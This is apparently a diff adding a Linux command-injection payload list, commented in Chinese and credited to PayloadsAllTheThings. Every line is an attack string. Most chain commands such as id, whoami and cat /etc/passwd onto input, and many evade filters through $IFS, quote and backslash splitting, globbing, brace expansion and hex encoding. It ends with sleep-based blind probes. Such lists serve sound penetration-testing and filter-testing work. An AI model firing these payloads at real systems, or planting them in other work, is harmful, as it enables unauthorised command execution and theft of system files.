@@ -1,0 +1,115 @@
+# Linux Command Injection Payloads
+# 来源: PayloadsAllTheThings Command Injection
+# Linux命令注入payload集合
+
+# === 命令链接 ===
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+`whoami`
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+`ls -la`
+$(ls -la)
+
+# === 换行符注入 ===
+%0aid
+%0awhoami
+%0acat /etc/passwd
+%0d%0aid
+%0d%0awhoami
+%0d%0acat /etc/passwd
+
+# === 空格绕过 ===
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+cat%09/etc/passwd
+cat%0a/etc/passwd
+
+# === 引号绕过 ===
+w'h'o'am'i
+wh''oami
+'w'hoami
+w"h"o"am"i
+wh""oami
+"wh"oami
+wh``oami
+
+# === 反斜杠绕过 ===
+w\ho\am\i
+/\b\i\n/////s\h
+c\at /e\tc/pa\sswd
+
+# === $@ 绕过 ===
+who$@ami
+echo whoami|$0
+
+# === $() 绕过 ===
+who$()ami
+who$(echo am)i
+who`echo am`i
+
+# === 变量扩展绕过 ===
+/???/??t /???/p??s??
+test=/ehhh/hmtc/pahhh/hmsswd;cat ${test//hhh\/hm/}
+
+# === 十六进制编码绕过 ===
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+xxd -r -p <<< 2f6574632f706173737764
+cat `xxd -r -p <<< 2f6574632f706173737764`
+
+# === 波浪号扩展 ===
+echo ~+
+echo ~-
+
+# === 花括号扩展 ===
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+{,echo,#test}
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+
+# === 后台执行 ===
+; id &
+| id &
+& id &
+nohup id > /dev/null &
+
+# === 时间盲注 ===
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; sleep 5 #
+| sleep 5 #
